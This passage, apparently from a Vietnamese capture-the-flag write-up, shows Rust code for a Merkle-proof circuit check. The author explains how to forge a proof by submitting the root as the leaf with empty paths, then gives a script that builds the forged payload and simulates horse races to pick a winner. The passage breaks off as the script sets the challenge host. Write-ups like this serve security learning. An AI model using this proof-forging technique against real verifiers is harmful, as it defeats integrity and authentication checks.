</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">expected_depth</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">proof</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">path_elements</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">&lt;</span><span class="n">Fp</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">proof</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="n">_</span><span class="p">,</span><span class="w"> </span><span class="n">sibling</span><span class="p">)</span><span class="o">|</span><span class="w"> </span><span class="n">Value</span>::<span class="n">known</span><span class="p">(</span><span class="o">*</span><span class="n">sibling</span><span class="p">)).</span><span class="n">collect</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">path_indices</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">&lt;</span><span class="n">Fp</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">proof</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="n">is_left</span><span class="p">,</span><span class="w"> </span><span class="n">_</span><span class="p">)</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">bit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">*</span><span class="n">is_left</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Fp</span>::<span class="n">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Fp</span>::<span class="n">from</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Value</span>::<span class="n">known</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">circuit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MerkleCircuit</span>::<span class="o">&lt;</span><span class="n">OrchardNullifier</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">leaf</span>: <span class="nc">Value</span>::<span class="n">known</span><span class="p">(</span><span class="n">leaf</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">path_elements</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">path_indices</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">_spec</span>: <span class="nc">PhantomData</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">MockProver</span>::<span class="n">run</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">circuit</span><span class="p">,</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="fm">vec!</span><span class="p">[</span><span class="n">root</span><span class="p">]])</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">prover</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">is_valid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prover</span><span class="p">.</span><span class="n">verify</span><span class="p">().</span><span class="n">is_ok</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">is_valid</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">err</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Vì vậy ta có thể forge proof thành: (<code>index</code>, <code>leaf</code>, <code>path_elements</code>, <code>path_indices</code>) = (<code>index</code>, <code>merkle_root</code>, [], []). Vấn đề là con ngựa vị trí số mấy sẽ chiến thắng?</p>
<p>Giải pháp của tôi cho vấn đề này là ta sẽ mô phỏng 50000 trận giả lập bằng thư viện <code>rayon</code> cùng lúc trên tất cả các nhân CPU và tìm ra con ngựa có số lần về nhất nhiều nhất.
Sau đây là script của tôi:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#![allow(dead_code)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#![allow(unused_imports)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#![allow(unused_variables)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">mod</span> <span class="nn">config</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">mod</span> <span class="nn">merkle</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">mod</span> <span class="nn">merkle_circuit</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">mod</span> <span class="nn">racing</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">mod</span> <span class="nn">server</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">mod</span> <span class="nn">uma</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">io</span>::<span class="p">{</span><span class="n">BufRead</span><span class="p">,</span><span class="w"> </span><span class="n">BufReader</span><span class="p">,</span><span class="w"> </span><span class="n">Write</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">net</span>::<span class="n">TcpStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">sync</span>::<span class="p">{</span><span class="n">Arc</span><span class="p">,</span><span class="w"> </span><span class="n">Mutex</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">rand</span>::<span class="p">{</span><span class="n">Rng</span><span class="p">,</span><span class="w"> </span><span class="n">SeedableRng</span><span class="p">,</span><span class="w"> </span><span class="n">rngs</span>::<span class="n">StdRng</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">regex</span>::<span class="n">Regex</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">serde</span>::<span class="p">{</span><span class="n">Serialize</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">rayon</span>::<span class="n">prelude</span>::<span class="o">*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="k">crate</span>::<span class="n">racing</span>::<span class="p">{</span><span class="n">simulate_race</span><span class="p">,</span><span class="w"> </span><span class="n">RaceEntry</span><span class="p">,</span><span class="w"> </span><span class="n">Strategy</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[derive(Serialize)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">struct</span> <span class="nc">ForgedProofPayload</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">index</span>: <span class="kt">usize</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">leaf</span>: <span class="nb">String</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">path_elements</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">path_indices</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[derive(Clone, Debug)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">struct</span> <span class="nc">ParsedHorse</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">index</span>: <span class="kt">usize</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">name</span>: <span class="nb">String</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">strategy</span>: <span class="nc">Strategy</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">stats</span>: <span class="p">[</span><span class="kt">u64</span><span class="p">;</span><span class="w"> </span><span class="mi">5</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">predict_winner_parallel</span><span class="p">(</span><span class="n">horses</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="n">ParsedHorse</span><span class="p">],</span><span class="w"> </span><span class="n">race_distance</span>: <span class="kt">u32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">usize</span> <span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">entries_map</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="nb">Option</span><span class="o">&lt;</span><span class="n">RaceEntry</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="nb">None</span><span class="p">;</span><span class="w"> </span><span class="mi">16</span><span class="p">];</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">horses</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">h</span><span class="p">.</span><span class="n">index</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">entries_map</span><span class="p">[</span><span class="n">h</span><span class="p">.</span><span class="n">index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">RaceEntry</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">name</span>: <span class="nc">h</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">speed</span>: <span class="nc">h</span><span class="p">.</span><span class="n">stats</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">stamina</span>: <span class="nc">h</span><span class="p">.</span><span class="n">stats</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">power</span>: <span class="nc">h</span><span class="p">.</span><span class="n">stats</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">guts</span>: <span class="nc">h</span><span class="p">.</span><span class="n">stats</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">wit</span>: <span class="nc">h</span><span class="p">.</span><span class="n">stats</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">strategy</span>: <span class="nc">h</span><span class="p">.</span><span class="n">strategy</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">valid_entries</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="n">RaceEntry</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">entries_map</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">filter_map</span><span class="p">(</span><span class="o">|</span><span class="n">e</span><span class="o">|</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="n">clone</span><span class="p">()).</span><span class="n">collect</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">valid_entries</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;[!] WARNING: Only </span><span class="si">{}</span><span class="s">/16 horses parsed. Prediction may be inaccurate.&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">valid_entries</span><span class="p">.</span><span class="n">len</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">valid_entries</span><span class="p">.</span><span class="n">is_empty</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">simulations</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">50_000</span><span class="p">;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">win_counts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="n">simulations</span><span class="p">).</span><span class="n">into_par_iter</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">rng</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span>::<span class="n">thread_rng</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">seed</span>: <span class="kt">u64</span> <span class="o">=</span><span class="w"> </span><span class="n">rng</span><span class="p">.</span><span class="n">gen</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">simulate_race</span><span class="p">(</span><span class="o">&amp;</span><span class="n">valid_entries</span><span class="p">,</span><span class="w"> </span><span class="n">race_distance</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w"> </span><span class="n">seed</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">results</span><span class="p">.</span><span class="n">first</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="n">r</span><span class="o">|</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">index</span><span class="p">).</span><span class="n">unwrap_or</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">fold</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">0</span><span class="k">u32</span><span class="p">;</span><span class="w"> </span><span class="mi">16</span><span class="p">],</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">|</span><span class="k">mut</span><span class="w"> </span><span class="n">acc</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u32</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">winner_idx</span>: <span class="kt">usize</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="n">winner_idx</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">acc</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">acc</span><span class="p">[</span><span class="n">winner_idx</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">acc</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">reduce</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">0</span><span class="k">u32</span><span class="p">;</span><span class="w"> </span><span class="mi">16</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">|</span><span class="k">mut</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">16</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">a</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">best_idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">max_wins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">--- High-Precision Analysis (</span><span class="si">{}</span><span class="s"> Sims) ---&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">simulations</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wins</span><span class="p">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">win_counts</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">enumerate</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">entries_map</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">win_rate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">wins</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">simulations</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">100.0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">wins</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">max_wins</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">max_wins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">wins</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">best_idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">win_rate</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">1.0</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;Idx </span><span class="si">{:&lt;2}</span><span class="s"> | Win Rate: </span><span class="si">{:&gt;5.2}</span><span class="s">% (</span><span class="si">{:&gt;5}</span><span class="s"> wins) | Strat: </span><span class="si">{:?}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">win_rate</span><span class="p">,</span><span class="w"> </span><span class="n">wins</span><span class="p">,</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="n">strategy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;&gt;&gt;&gt; BEST CHOICE: Index </span><span class="si">{}</span><span class="s"> (Confidence: </span><span class="si">{:.2}</span><span class="s">%)&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">best_idx</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">max_wins</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">simulations</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">f64</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">100.0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">best_idx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span>-&gt; <span class="nc">std</span>::<span class="n">io</span>::<span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">target_host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;challenge.cnsc.com.vn&#34;</span><span class="p">;</span><span class="o">-</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">target_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">30384</span><span class="p">;</span><span class="w">
